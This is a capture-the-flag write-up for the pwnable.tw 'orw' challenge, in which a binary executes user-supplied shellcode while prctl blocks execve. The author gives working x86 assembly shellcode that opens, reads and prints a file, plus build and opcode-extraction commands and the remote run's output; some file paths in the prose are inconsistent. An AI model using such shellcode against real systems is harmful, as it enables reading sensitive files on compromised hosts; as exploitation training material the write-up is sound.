# orw (pwn, pwnabletw, shellcode, prctl)

Notes:
- binary given
- ASLR enabled

## Enumeration
We are given a 32 bit binary:

```bash
$ file orw 
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

with almost no protections enabled:

```bash
$ checksec orw
[*] './orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

After quick reverse engineering we can reconstruct program logic.
Program pseudocode:

```c
shellcode[200];

int main() {
    prctl(PR_SET_NO_NEW_PRIVS);

    puts("Give my your shellcode:");
    read(stdin, shellcode, sizeof(shellcode));

    ((void(*)())shellcode)();
}
```

So, wait! The program realy invokes the shellcode we give him. Unfortunetely, the standard 
`asm(shellcraft.sh())` from pwntools won't work as prctl called with PR_SET_NO_NEW_PRIVS option
prevents the proccess of calling execve.

From [prctl man page](http://man7.org/linux/man-pages/man2/prctl.2.html):

```
prctl - operations on a process
[...]
PR_SET_NO_NEW_PRIVS (since Linux 3.5)
        Set the calling thread's no_new_privs attribute to the value
        in arg2.  With no_new_privs set to 1, execve(2) promises not
        to grant privileges to do anything that could not have been
        done without the execve(2) call (for example, rendering the
        set-user-ID and set-group-ID mode bits, and file capabilities
        non-functional).  Once set, this the no_new_privs attribute
        cannot be unset.  The setting of this attribute is inherited
        by children created by fork(2) and clone(2), and preserved
        across execve(2).
```

## Exploit
As stated in task description we need to find a way around. We want program which will:

```c
int fd = open('/home/orw/flag', O_RDONLY);
read(fd, &stack, 40); // we don't have to declare any buffer. Just store content of flag on stack.
write(stdout, &stack, 40);
```

This will be super easy to write it in assembly code:

```asm
section .text
global _start

_start:
    jmp to_the_end

open_flag_file:
    pop ebx         ; filename=address of "flag.txt"
    mov ecx, 0x0    ; flags=O_RDONLY
    mov edx, 0x0    ; no mode
    mov eax, 0x5    ; sys_open()
    int 0x80        ; exec open()

read_flag_content:
    mov ebx, eax    ; fd from above open is in eax
    mov ecx, esp    ; just read content on stack
    mov edx, 0x30   ; just read whole flag
    mov eax, 0x3    ; sys_read()
    int 0x80        ; exec read()

write_flag_content:
    mov ebx, 0x1    ; write flag to stdout
                    ; don't change ecx as it points already on flag content
    mov eax, 0x4    ; sys_write()
    int 0x80        ; exec write()

exit:
    mov ebx, 0x0    ; exit with no error code
    mov eax, 0x01   ; sys_exit()
    int 0x80        ; exec exit()


to_the_end:
    call open_flag_file
    db '/home/orw/flag', 0, 'A'
```

<b>Note:</b> </br>
We used a standard trick with `db '/home/orw/flag', 0, 'A'`. 
It just generates a "/home/rd/flag" bytestring at the end of our shellcode.
'0' is needed as a string terminator. 'A' is needed as objdump would cut this NULL byte  if left at the end.

Now we can test our shellcode localy (either create /home/ord/flag file or just change shellcode flag file path)

```bash
$ echo "flag{test_flag}" > /home/ord/flag
$ nasm -f elf shellcode.asm -o shellcode.o
$ ld -m elf_i386 shellcode.o -o shellcode
$ ./shellcode
flag{test_flag}
```

And to extract opcodes:

```bash
$ for i in `objdump -d shellcode.o |grep "^ " |cut -f2`; do echo -n '\x'$i; done; echo
```

And that's all! We just have to send our shellcode now.

```bash
$ python3 exp.py 
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[*] Switching to interactive mode
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
\x00\xe4\x[*] Got EOF while reading in interactive
$  
```